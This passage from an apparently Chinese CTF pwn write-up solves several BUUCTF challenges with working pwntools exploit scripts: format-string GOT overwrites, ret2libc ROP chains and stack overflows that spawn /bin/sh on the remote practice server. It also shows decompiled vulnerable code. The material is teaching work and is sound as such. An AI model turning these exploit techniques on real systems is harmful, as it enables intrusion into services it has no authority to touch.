class="hljs-symbol">.text:</span><span class="hljs-number">08049335</span>                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">eax</span>             <span class="hljs-comment">; command</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08049336</span>                 <span class="hljs-keyword">call</span>    _system<br></code></pre></td></tr></table></figure><p>格式化字符串漏洞中自己算偏移、字节数太麻烦，我们可以使用pwntools的fmtstr_payload函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">25944</span>)<br><span class="hljs-comment">#sh = process(&#x27;./pwn-buu&#x27;)</span><br>elf=ELF(<span class="hljs-string">&#x27;./pwn-buu&#x27;</span>)<br><br>atoi_got=elf.got[<span class="hljs-string">&#x27;atoi&#x27;</span>]<br><br>target_addr=<span class="hljs-number">0x0804932F</span><br><br>payload=fmtstr_payload(<span class="hljs-number">10</span>,&#123;atoi_got:target_addr&#125;)<br><br>sh.send(payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><p>代码说明：</p><ul><li>导入 pwn 库；</li><li>连接远程主机 <a href="http://node4.buuoj.cn/">node4.buuoj.cn</a> 的 25944 端口（或者使用本地进程）；</li><li>解析 ELF 可执行文件 pwn-buu，获取 atoi 函数的 GOT 地址；</li><li>指定目标函数地址 target_addr，此处为 0x0804932F；</li><li>调用 fmtstr_payload() 函数生成恶意格式化字符串，将 atoi 函数的 GOT 地址覆盖为目标地址；</li><li>将 payload 发送给目标主机，并进入交互模式，等待攻击结果。</li></ul><h2 id="思路2：改写dword-804C044值"><a href="#思路2：改写dword-804C044值" class="headerlink" title="思路2：改写dword_804C044值"></a>思路2：改写dword_804C044值</h2><p>把0x804C044的值改写为0，然后输入密码0</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">25944</span>)<br><span class="hljs-comment">#sh = process(&#x27;./pwn-buu&#x27;)</span><br>elf=ELF(<span class="hljs-string">&#x27;./pwn-buu&#x27;</span>)<br><br><span class="hljs-comment">#atoi_got=elf.got[&#x27;atoi&#x27;]</span><br><br>dword_804C044=<span class="hljs-number">0x804C044</span><br><br>target_addr=<span class="hljs-number">0x0804932F</span><br><br>payload=fmtstr_payload(<span class="hljs-number">10</span>,&#123;dword_804C044:<span class="hljs-number">0x0</span>&#125;)<br><br>sh.sendlineafter(<span class="hljs-string">&#x27;your name:&#x27;</span>,payload)<br>sh.sendlineafter(<span class="hljs-string">&#x27;your passwd:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0x0</span>))<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><h1 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// local variable allocation has failed, the output may be wrong!</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> v4; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  init(*(_QWORD *)&amp;argc, argv, envp);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;EEEEEEE                            hh      iii                &quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;EE      mm mm mmmm    aa aa   cccc hh          nn nnn    eee  &quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;EEEEE   mmm  mm  mm  aa aaa cc     hhhhhh  iii nnn  nn ee   e &quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;EE      mmm  mm  mm aa  aaa cc     hh   hh iii nn   nn eeeee  &quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;EEEEEEE mmm  mm  mm  aaa aa  ccccc hh   hh iii nn   nn  eeeee &quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;====================================================================&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome to this Encryption machine\n&quot;</span>);<br>  begin();<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      fflush(<span class="hljs-number">0LL</span>);<br>      v4 = <span class="hljs-number">0</span>;<br>      __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v4);<br>      getchar();<br>      <span class="hljs-keyword">if</span> ( v4 != <span class="hljs-number">2</span> )<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;I think you can do it by yourself&quot;</span>);<br>      begin();<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( v4 == <span class="hljs-number">3</span> )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Bye!&quot;</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( v4 != <span class="hljs-number">1</span> )<br>      <span class="hljs-keyword">break</span>;<br>    encrypt();<br>    begin();<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Something Wrong!&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>进入encrypt函数看一下，发现对输入的字符串进行了异或，按理说需要再异或一次得到原值，但是strlen(s)判定条件导致了不会对rbp和返回地址进行异或，因此不需要再异或一次。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">encrypt</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">size_t</span> v0; <span class="hljs-comment">// rbx</span><br>  <span class="hljs-keyword">char</span> s[<span class="hljs-number">48</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-50h]</span><br>  __int16 v3; <span class="hljs-comment">// [rsp+30h] [rbp-20h]</span><br><br>  <span class="hljs-built_in">memset</span>(s, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(s));<br>  v3 = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Input your Plaintext to be encrypted&quot;</span>);<br>  gets(s);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    v0 = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)x;<br>    <span class="hljs-keyword">if</span> ( v0 &gt;= <span class="hljs-built_in">strlen</span>(s) )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">if</span> ( s[x] &lt;= <span class="hljs-number">96</span> || s[x] &gt; <span class="hljs-number">122</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( s[x] &lt;= <span class="hljs-number">64</span> || s[x] &gt; <span class="hljs-number">90</span> )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( s[x] &gt; <span class="hljs-number">47</span> &amp;&amp; s[x] &lt;= <span class="hljs-number">57</span> )<br>          s[x] ^= <span class="hljs-number">0xF</span>u;<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        s[x] ^= <span class="hljs-number">0xE</span>u;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      s[x] ^= <span class="hljs-number">0xD</span>u;<br>    &#125;<br>    ++x;<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Ciphertext&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(s);<br>&#125;<br></code></pre></td></tr></table></figure><p>思路：</p><ul><li>使用ROP泄露出puts的got地址，再利用LibcSearcher得到libc的版本</li><li>由于libc内的函数最低12位不随着libc库版本的改变而改变，因此只要得到puts函数的地址，就可以得到libc的版本</li><li>由于libc内的函数的相对偏移不随着libc库版本的改变而改变，因此只要得到puts函数的地址，就可以得到其余函数的地址（比如system函数、sh字符串）</li></ul><p>有几个易错的点：</p><ul><li>64位使用寄存器传参，而不是栈，因此构造rop链的时候，需要使用pop_rdi_ret将参数放在寄存器之后调用函数。<code>payload = b&#39;a&#39; * (88)  + p64(ret) +  p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)</code></li><li>使用recv族函数吞掉多余的输出，并获取地址<code>puts_addr = u64(sh.recvline()[:-1].ljust(8,b&#39;\x00&#39;)) # puts puts_got.get puts addr</code></li><li>由于Ubuntu18的运行机制，此题不加ret则栈无法对齐（貌似system函数必须在地址以0结束的位置，而本题是8）</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> * <br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.terminal=[<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br><br><span class="hljs-comment">#sh = process(&#x27;./ciscn_2019_c_1&#x27;)</span><br>sh=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">27910</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./ciscn_2019_c_1&#x27;</span>)<br><br><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br><span class="hljs-comment"># 0x0000000000400c83 : pop rdi ; ret</span><br><br>pop_rdi_ret=<span class="hljs-number">0x0000000000400c83</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">88</span>) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt)+p64(main)<br><br><span class="hljs-comment"># gdb.attach(sh) </span><br><br>sh.recv()<br>sh.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>sh.recvuntil(<span class="hljs-string">&quot;Input your Plaintext to be encrypted\n&quot;</span>)<br><br>sh.sendline(payload)<br><br>sh.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>)<span class="hljs-comment">#puts(&quot;Ciphertext&quot;);</span><br>sh.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>)<span class="hljs-comment">#puts(&quot;payload&quot;);</span><br>puts_addr = u64(sh.recvline()[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) <span class="hljs-comment"># puts puts_got.get puts addr</span><br><br><span class="hljs-comment">#print(hex(puts_addr))</span><br><span class="hljs-comment">#pause()</span><br><br>libc = LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>, puts_addr) <span class="hljs-comment">#  search libc</span><br><br>libc_base = puts_addr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>) <span class="hljs-comment">#  get libc base</span><br>system_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>) <span class="hljs-comment">#  get system addr</span><br>binsh_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>) <span class="hljs-comment">#  get /bin/sh addr</span><br><br><br>sh.recv()<br>sh.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>sh.recvuntil(<span class="hljs-string">&quot;Input your Plaintext to be encrypted\n&quot;</span>)<br><span class="hljs-comment">#gdb.attach(sh)</span><br>ret = <span class="hljs-number">0x00000000004006b9</span><br><span class="hljs-comment">#错误的：payload = b&#x27;a&#x27; * (88)  + p64(system_addr) + p64(0xaaaa) + p64(binsh_addr)</span><br><span class="hljs-comment"># Ubuntu18运行机制  不加ret 则栈无法对齐，即system的尾部是8而不是0：payload = b&#x27;a&#x27; * (88)  + p64(ret)+p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">88</span>)  + p64(ret) +  p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)<br>sh.sendline(payload)<br><br>sh.interactive()<br><br></code></pre></td></tr></table></figure><h1 id="ciscn-2019-n-8-1"><a href="#ciscn-2019-n-8-1" class="headerlink" title="ciscn_2019_n_8-1"></a>ciscn_2019_n_8-1</h1><p>保护全开，看下源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> v4; <span class="hljs-comment">// [esp-14h] [ebp-20h]</span><br>  <span class="hljs-keyword">int</span> v5; <span class="hljs-comment">// [esp-10h] [ebp-1Ch]</span><br><br>  var[<span class="hljs-number">13</span>] = <span class="hljs-number">0</span>;<br>  var[<span class="hljs-number">14</span>] = <span class="hljs-number">0</span>;<br>  init();<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;What&#x27;s your name?&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%s&quot;</span>, var, v4, v5);<br>  <span class="hljs-keyword">if</span> ( *(_QWORD *)&amp;var[<span class="hljs-number">13</span>] )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( *(_QWORD *)&amp;var[<span class="hljs-number">13</span>] == <span class="hljs-number">17LL</span> )<br>      system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <span class="hljs-keyword">else</span><br>      <span class="hljs-built_in">printf</span>(<br>        <span class="hljs-string">&quot;something wrong! val is %d&quot;</span>,<br>        var[<span class="hljs-number">0</span>],<br>        var[<span class="hljs-number">1</span>],<br>        var[<span class="hljs-number">2</span>],<br>        var[<span class="hljs-number">3</span>],<br>        var[<span class="hljs-number">4</span>],<br>        var[<span class="hljs-number">5</span>],<br>        var[<span class="hljs-number">6</span>],<br>        var[<span class="hljs-number">7</span>],<br>        var[<span class="hljs-number">8</span>],<br>        var[<span class="hljs-number">9</span>],<br>        var[<span class="hljs-number">10</span>],<br>        var[<span class="hljs-number">11</span>],<br>        var[<span class="hljs-number">12</span>],<br>        var[<span class="hljs-number">13</span>],<br>        var[<span class="hljs-number">14</span>]);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s, Welcome!\n&quot;</span>, var);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Try do something~&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>只需将数组var的第14个元素改成17即可。每个数组值为4个字节，因此<code>payload=b&#39;\x11\x00\x00\x00&#39;*14</code>，注意如果修改了第15个元素，也即是var[14]会报错</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> * <br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.terminal=[<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br><br>sh = process(<span class="hljs-string">&#x27;./ciscn_2019_n_8&#x27;</span>)<br><span class="hljs-comment">#sh=remote(&#x27;node4.buuoj.cn&#x27;, 27910)</span><br>elf = ELF(<span class="hljs-string">&#x27;./ciscn_2019_n_8&#x27;</span>)<br><br>payload=<span class="hljs-string">b&#x27;\x11\x00\x00\x00&#x27;</span>*<span class="hljs-number">14</span><br><span class="hljs-comment">#b&#x27;\x11\x00\x00\x00&#x27;*30</span><br>sh.sendline(payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><h1 id="jarvisoj-level2"><a href="#jarvisoj-level2" class="headerlink" title="jarvisoj_level2"></a>jarvisoj_level2</h1><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">~&gt;</span> <span class="hljs-string">pwn</span> <span class="hljs-string">checksec</span> <span class="hljs-string">./level2</span><br>[<span class="hljs-string">*</span>] <span class="hljs-string">&#x27;/home/philo/level2&#x27;</span><br>    <span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span><br>    <span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br>    <span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br>    <span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br>    <span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span><br></code></pre></td></tr></table></figure><p>read读入256字节，存在溢出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">ssize_t</span> <span class="hljs-title">vulnerable_function</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> buf[<span class="hljs-number">136</span>]; <span class="hljs-comment">// [esp+0h] [ebp-88h] BYREF</span><br><br>  system(<span class="hljs-string">&quot;echo Input:&quot;</span>);<br>  <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x100</span>u);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  vulnerable_function();<br>  system(<span class="hljs-string">&quot;echo &#x27;Hello World!&#x27;&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>shift+f12查看字符串，发现了sh</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">.data:<span class="hljs-number">0804</span>A024 <span class="hljs-keyword">hint</span>            db <span class="hljs-string">&#x27;/bin/sh&#x27;</span>,<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>水题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> * <br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.terminal=[<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br><br><span class="hljs-comment">#sh = process(&#x27;./ciscn_2019_n_8&#x27;)</span><br>sh=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">27901</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./level2&#x27;</span>)<br><br>sys_addr=<span class="hljs-number">0x08048320</span><br>binsh_addr=<span class="hljs-number">0x0804A024</span><br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x88</span>+<span class="hljs-number">4</span>)+p32(sys_addr)+p32(<span class="hljs-number">0xdeadbeef</span>)+p32(binsh_addr)<br><br>sh.sendline(payload)<br><br>sh.interactive()<br><br><br></code></pre></td></tr></table></figure><h1 id="bjdctf-2020-babystack"><a href="#bjdctf-2020-babystack" class="headerlink" title="bjdctf_2020_babystack"></a>bjdctf_2020_babystack</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> buf[<span class="hljs-number">12</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-10h] BYREF</span><br>  <span class="hljs-keyword">size_t</span> nbytes; <span class="hljs-comment">// [rsp+Ch] [rbp-4h] BYREF</span><br><br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0LL</span>);<br> <br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+]Please input the length of your name:&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;nbytes);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+]What&#x27;s u name?&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)nbytes);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>先输入100，使得读入100个字节，导致溢出</li><li>在代码段找到system_sh，地址为00000000004006E6</li></ul><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004006E6</span> <span class="hljs-comment">; __unwind &#123;</span><br><span 